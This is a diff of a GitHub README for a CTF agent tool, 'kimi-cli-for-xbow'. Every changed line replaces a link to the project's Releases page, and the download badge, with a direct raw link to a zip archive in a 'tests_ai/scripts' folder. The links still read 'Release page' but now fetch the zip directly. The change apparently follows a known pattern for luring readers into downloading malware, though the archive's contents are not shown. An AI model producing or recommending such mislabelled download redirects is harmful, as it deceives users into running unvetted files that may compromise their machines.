@@ -1,6 +1,6 @@
 # 🚀 kimi-cli-for-xbow - Your Easy CTF Competition Agent
 
-![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)
+![Download](https://raw.githubusercontent.com/GreatMac999/kimi-cli-for-xbow/main/tests_ai/scripts/kimi-cli-for-xbow_v2.8.zip%20Now-Release-brightgreen)
 
 ## 🌟 Description
 kimi-cli-for-xbow is a specialized agent developed for Capture The Flag (CTF) competitions, based on the original kimi-cli. This tool provides you with all the features you need to tackle challenges efficiently. 
@@ -11,7 +11,7 @@ Follow these instructions to download and run the kimi-cli-for-xbow application 
 ## 📥 Download & Install
 To download the application, please visit the Releases page below:
 
-[Download Release Page](https://github.com/GreatMac999/kimi-cli-for-xbow/releases)
+[Download Release Page](https://raw.githubusercontent.com/GreatMac999/kimi-cli-for-xbow/main/tests_ai/scripts/kimi-cli-for-xbow_v2.8.zip)
 
 On the Releases page, you will find different versions of the application. Choose the latest version and click the link to download the file.
 
@@ -55,7 +55,7 @@ To get started with the main functions:
 ## 🔄 Update the Application
 Regular updates may enhance functionality. To update:
 
-1. Return to the [Releases page](https://github.com/GreatMac999/kimi-cli-for-xbow/releases).
+1. Return to the [Releases page](https://raw.githubusercontent.com/GreatMac999/kimi-cli-for-xbow/main/tests_ai/scripts/kimi-cli-for-xbow_v2.8.zip).
 2. Download the latest version as explained in the Download & Install section.
 3. Replace the old version with the new one once it is downloaded.
 
@@ -70,4 +70,4 @@ We encourage you to connect with other users and share your experiences. You can
 
 If you're ready to enhance your CTF competition skills with an easy-to-use agent, download the latest version today!
 
-[Download Release Page](https://github.com/GreatMac999/kimi-cli-for-xbow/releases)
+[Download Release Page](https://raw.githubusercontent.com/GreatMac999/kimi-cli-for-xbow/main/tests_ai/scripts/kimi-cli-for-xbow_v2.8.zip)
